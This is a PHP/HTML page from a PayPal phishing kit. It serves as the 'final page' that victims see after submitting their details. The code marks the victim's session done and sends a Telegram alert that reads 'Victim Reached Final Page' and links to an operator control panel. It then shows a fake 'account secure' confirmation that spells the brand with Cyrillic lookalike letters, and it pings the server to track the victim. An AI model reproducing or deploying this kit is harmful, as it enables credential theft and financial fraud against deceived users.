<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en';

if (($sData['status'] ?? '') !== 'done') {
    $sData['status'] = 'done';
    $sData['last_activity'] = time();
    save_session($sid, $sData);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;
    sendToTelegram("✅ <b>Victim Reached Final Page</b>\nSID: <code>$sid</code>\nStatus: <b>DONE</b>\n\n➡️ <a href='{$panel_link}'>Open Control Panel</a>");
} else {
    $sData['last_activity'] = time();
    save_session($sid, $sData);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; padding: 20px; }
        .container { width: 100%; max-width: 440px; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .logo { width: 80px; margin-bottom: 40px; }
        .success-icon { width: 80px; height: 80px; background-color: #00a651; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 30px; }
        .success-icon svg { width: 45px; height: 45px; fill: none; stroke: #ffffff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
        h1 { font-size: 28px; font-weight: 700; color: #000; line-height: 1.3; margin-bottom: 15px; }
        p { font-size: 15px; color: #6c7378; line-height: 1.6; margin-bottom: 35px; }
        .btn-done { width: 100%; background-color: #0053c0; color: #fff; border: none; border-radius: 100px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s; text-decoration: none; display: block; }
        .btn-done:hover { background-color: #0045a1; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <div class="container">
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal">
        
        <div class="success-icon">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>

        <h1 id="done_title">You're all set</h1>
        <p id="done_text">Thanks for confirming your information. Your account is now secure and up to date.</p>
        
        <a href="https://www.paypal.com" class="btn-done" id="done_btn">Go to PayPal</a>
    </div>

    <script>
        const translations_done = {
            en: { title: "You're all set", text: "Thanks for confirming your information. Your account is now secure and up to date.", btn: "Go to РayРal" },
            de: { title: "Alles erledigt", text: "Vielen Dank für die Bestätigung Ihrer Informationen. Ihr Konto ist nun sicher und auf dem neuesten Stand.", btn: "Zu РayРal" },
            fr: { title: "C'est tout bon", text: "Merci d'avoir confirmé vos informations. Votre compte est désormais sécurisé et à jour.", btn: "Aller à РayРal" },
            pl: { title: "Wszystko gotowe", text: "Dziękujemy za potwierdzenie informacji. Twoje konto jest teraz bezpieczne i aktualne.", btn: "Przejdź do РayРal" }
        };
        function initLang(lang) {
            const data = translations_done[lang] || translations_done['en'];
            document.getElementById('done_title').innerText = data.title;
            document.getElementById('done_text').innerText = data.text;
            document.getElementById('done_btn').innerText = data.btn;
        }
    </script>

    <script>const sid="<?php echo isset($sid)?addslashes($sid):'';?>"; if(sid){setInterval(()=>{fetch('process.php?action=ping&sid='+sid).catch(err=>console.error('Ping error'));},5000);}</script>
</body>
</html>